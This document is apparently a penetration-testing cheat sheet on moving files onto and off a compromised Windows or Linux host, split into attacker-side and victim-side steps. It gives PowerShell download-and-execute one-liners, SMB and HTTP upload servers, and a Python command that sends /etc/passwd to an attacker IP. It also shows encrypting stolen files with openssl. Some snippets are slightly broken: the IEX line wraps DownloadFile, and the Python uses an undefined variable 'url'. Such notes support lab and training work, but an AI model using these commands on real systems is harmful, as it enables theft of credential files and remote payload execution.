//How to transfer files in Powershell

## Via BASE64Encoded

```
[IO.File]::WriteAllBytes("PATH", [Convert]::FromBase64String("BASE64CODE"))
```

## Download via Powershell
```
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

## Download via Powershell(FileLess)
```
IEX (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

## Download via newer Powershell
```
Invoke-WebRequest https://<ip>/ -OutFile file.ps1
```

## How to transfer files via SMB
`sudo impacket-smbserver SHARENAME -smb2support PATH -user USER -password PASS`
On victim
`net use n: \\IP\SHARENAME /user:USER PASS`

## How to upload files
On attacker
```
python3 -m uploadserver
```
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
On victim
`Invoke-FileUpload -Uri ATTACKERIP/PATH -File FILEPATHTOTRANSFER`

## How to upload via SCP(Linux)
`scp FILEPATHTOUPLOAD USER@IP:/PATH/WHERE/TO/SAVE`


//How to Upload with Python Code
```
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
# To use the requests function, we need to import the module first.
import requests 
# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"
# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")
# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

## How to Encrypt files in Windows
https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
`Import-Module .\Invoke-AESEncryption.ps1`
Now encrypt a file:
`Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt`

## How to Encrypt file in Linux
`openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`
## How to decrypt
`openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`